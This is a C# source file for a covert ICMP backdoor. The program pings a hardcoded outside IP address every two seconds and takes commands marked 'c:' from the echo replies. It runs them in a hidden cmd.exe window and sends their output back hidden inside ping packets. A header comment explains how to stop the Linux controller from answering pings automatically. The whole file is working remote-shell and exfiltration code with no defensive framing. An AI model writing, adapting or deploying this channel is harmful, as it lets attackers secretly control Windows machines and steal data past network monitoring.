// ICMP Sending

using System;
using System.Text;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Threading;

/*

    The linux kernel is setup to conduct an automatic echo reply.  How to disable it on linux is below...
    To disable kernel ping replies, we added the following line to the /etc/sysctl.conf file: net.ipv4.icmp_echo_ignore_all=1.
    sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

*/

namespace SendICMP
{
    static class Proram
    {
        static void Main()
        {
            string destIP = "64.137.165.77";
            int delaySeconds = 2;
            string outputCmdTXT = "";
            Ping pingSender = new Ping ();
            // Create a buffer of 32 bytes of data to be transmitted.
            string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
            string executeCMD;

            while (true) {
                Thread.Sleep(delaySeconds * 1000);      // Sleep for x seconds in the loop
                if ((outputCmdTXT.Length > 0) && (outputCmdTXT.Length <= 200)) {
                    //data = "output:";
                    // If the length is less than 200 place in data sent
                    data = outputCmdTXT.Substring(0,outputCmdTXT.Length-1);
                    outputCmdTXT = "";
                }
                else if (outputCmdTXT.Length > 200) {
                    data = outputCmdTXT.Substring(0,200);
                    outputCmdTXT = outputCmdTXT.Substring(201, (outputCmdTXT.Length - 201));
                }
                else {
                    data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
                }
                byte[] buffer = Encoding.ASCII.GetBytes (data);
                // Wait 10 seconds for a reply.
                int timeout = 10000;

                // Set options for transmission:
                // The data can go through 64 gateways or routers
                // before it is destroyed, and the data packet
                // cannot be fragmented.
                PingOptions options = new PingOptions (64, true);

                // Send the request.
                PingReply reply = pingSender.Send (destIP, timeout, buffer, options);

                if (reply.Status == IPStatus.Success)
                {
                    Console.WriteLine ("Address: {0}", reply.Address.ToString());
                    Console.WriteLine ("RoundTrip time: {0}", reply.RoundtripTime);
                    Console.WriteLine ("Time to live: {0}", reply.Options.Ttl);
                    //Console.WriteLine ("Don't fragment: {0}", reply.Options.DontFragment);
                    //Console.WriteLine ("Buffer size: {0}", reply.Buffer.Length);
                    Console.WriteLine ("Buffer: {0}", Encoding.UTF8.GetString(reply.Buffer));
                    executeCMD = Encoding.ASCII.GetString(reply.Buffer);
                    if (executeCMD.Contains("c:")) {
                        executeCMD = executeCMD.Replace("c:", "");
                        //Console.WriteLine(executeCMD);
                        if (executeCMD.Length > 0) {
                            Process p = new Process();
                            p.StartInfo.UseShellExecute = false;
		    	            p.StartInfo.RedirectStandardOutput = true;
    			            p.StartInfo.RedirectStandardError = true;
	    		            p.StartInfo.CreateNoWindow = true;
		    	            p.StartInfo.FileName="cmd.exe";
			                //p.StartInfo.Arguments = "/C ping -n 1 127.0.0.1";
			                p.StartInfo.Arguments = "/C " + executeCMD;
			                p.Start();
			                string output = p.StandardOutput.ReadToEnd();
                            outputCmdTXT += output;
	    		            p.WaitForExit();
                            Console.WriteLine(output);
                        }
                        else {
                            Console.WriteLine("Command is empty...");
                        }
                    }
                }
                else
                {
                    Console.WriteLine (reply.Status);
                }
            }
        }
    }
}    

    